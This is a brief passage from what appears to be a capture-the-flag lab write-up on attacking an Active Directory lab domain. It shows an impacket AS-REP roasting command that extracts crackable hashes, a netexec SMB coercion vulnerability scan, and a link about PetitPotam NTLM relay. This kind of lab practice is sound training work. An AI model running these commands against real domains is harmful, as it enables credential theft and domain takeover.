...
##  AESRepRoast
```
└─$ impacket-GetNPUsers -dc-ip 10.10.105.193 LAB.ENTERPRISE.THM/ -usersfile users.txt -outputfile hash -format john
```
...
Do AD vulnerability scans
```
└─$ netexec smb 10.10.105.193 -M coerce_plus
```
![](../../assets/images/ent/vuln.png)
Read more about PetitPotam [here](https://www.truesec.com/hub/blog/from-stranger-to-da-using-petitpotam-to-ntlm-relay-to-active-directory)